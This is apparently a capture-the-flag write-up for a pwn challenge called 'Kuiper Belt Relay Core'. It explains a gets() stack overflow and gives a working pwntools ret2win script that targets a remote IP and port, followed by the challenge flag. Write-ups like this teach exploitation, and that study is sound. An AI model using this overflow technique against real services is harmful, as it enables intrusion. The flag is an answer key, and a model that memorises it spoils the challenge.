---
title: "Kuiper Belt Relay Core"
ctf: "CSSCTF"
date: 2026-10-01
category: pwn
flag_format: "CSSCTF{...}"
---

The x86-64 service reads input with `gets()` into a 64-byte stack buffer. With no stack canary or PIE, the saved return address is 72 bytes from the start of the buffer. The unused `win()` prints `flag.txt`; the local build's address did not match the remote, so I used the remote error path to locate its entry at `0x401215`.

Send the overflow to `34.116.80.78:9998`:

```python
from pwn import *

io = remote("34.116.80.78", 9998)
io.recvuntil(b"Enter your message: ")
io.sendline(b"A" * 72 + p64(0x401215))
print(io.recvall(timeout=3).decode())
```

Flag:

```text
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```
